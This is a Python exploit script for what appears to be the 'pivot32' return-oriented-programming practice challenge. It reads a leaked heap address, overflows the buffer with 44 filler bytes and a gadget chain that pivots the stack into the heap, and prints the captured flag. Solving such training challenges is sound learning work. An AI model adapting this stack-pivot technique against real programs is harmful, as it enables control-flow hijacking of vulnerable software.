import subprocess
import re

def get_data(lines=5):
    data = ""
    for i in range(lines):
        data += proc.stdout.readline().decode()
    return data

def write_data(payload):
    proc.stdin.write(payload + "\n".encode())
    proc.stdin.flush()

def addr_conv(input):
    return input.to_bytes(4, "little")


proc = subprocess.Popen(r"./pivot32",
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)

gadg_pop_a = 0x080488C0
gadg_xch_a_s = 0x080488C2
gadg_mov_a_a = 0x080488C4
gadg_add_a_b = 0x080488C7

data = get_data(lines=6)

# Get the address in the heap
piv_addr_re = re.compile(r"pivot: (.+)")
pivot_addr = int(piv_addr_re.findall(data)[0], 16)

# The address of the ret2win function is 0x1faa57 bytes after our input
payload = addr_conv(pivot_addr + 0x1faa57)
write_data(payload)

# This part makes the program jump to the extension we wrote on the heap
payload = b"B" * 44 + addr_conv(gadg_pop_a) + addr_conv(pivot_addr) + addr_conv(gadg_xch_a_s)
write_data(payload)

# Get the last of the data, and print only the flag
print(get_data(lines=2).split("\n")[1])
